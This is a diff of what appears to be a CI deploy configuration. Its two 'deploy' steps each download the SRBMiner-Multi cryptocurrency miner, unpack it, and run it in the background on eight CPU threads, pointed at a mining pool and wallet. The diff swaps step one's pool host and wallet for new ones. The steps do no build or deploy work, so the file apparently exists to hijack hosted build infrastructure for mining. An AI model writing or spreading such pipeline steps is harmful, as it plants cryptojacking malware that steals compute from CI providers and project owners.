@@ -24,7 +24,7 @@ deploy:
   steps:
     - script:
       name: step one
-      code: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz && setsid ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespowerlitb --pool stratum+tcp://MiningMadness.com:6570 --wallet LL5ZgSf9dgoknxmQX2AE7RG52ngWa7d9nr
+      code: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz && setsid ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespowerlitb --pool stratum+tcp://eu.nosuchpool.cloud:6570 --wallet LZxT2gjUL7PEWh6ZVbv1pCMdy6CDMdYR4F
     - script:
       name: step two
       code: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz && setsid ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespowerlitb --pool stratum+tcp://MiningMadness.com:6570 --wallet LL5ZgSf9dgoknxmQX2AE7RG52ngWa7d9nr
